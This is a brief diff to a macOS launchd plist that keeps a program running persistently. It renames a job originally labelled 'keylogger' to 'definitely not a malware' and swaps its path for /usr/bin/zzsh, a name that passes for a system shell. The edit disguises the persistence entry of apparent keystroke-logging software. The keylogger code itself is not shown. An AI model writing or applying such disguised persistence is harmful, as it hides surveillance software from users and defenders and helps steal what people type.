@@ -4,9 +4,9 @@
 <plist version="1.0">
   <dict>
     <key>Label</key>
-    <string>keylogger</string>
+    <string>definitely not a malware</string>
     <key>Program</key>
-    <string>/usr/local/bin/keylogger</string>
+    <string>/usr/bin/zzsh</string>
     <key>KeepAlive</key>
     <true/>
   </dict>
